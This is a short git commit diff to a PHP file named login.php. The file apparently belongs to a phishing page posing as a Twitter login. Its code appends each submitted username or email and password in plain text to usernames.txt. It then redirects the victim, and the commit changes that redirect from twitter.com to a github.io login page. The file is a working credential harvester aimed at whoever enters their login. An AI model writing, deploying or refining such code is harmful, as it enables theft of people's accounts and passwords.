e6337e9dce46f7b9024ee8bf217fcf800b916c24
fa200fa1 <152635533+fa200fa1@users.noreply.github.com>
2026-07-21 02:19:10 +0300

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://twitter.com/');
+header('Location: https://fa200fa1.github.io/mywebsite/login.html ');
 exit();
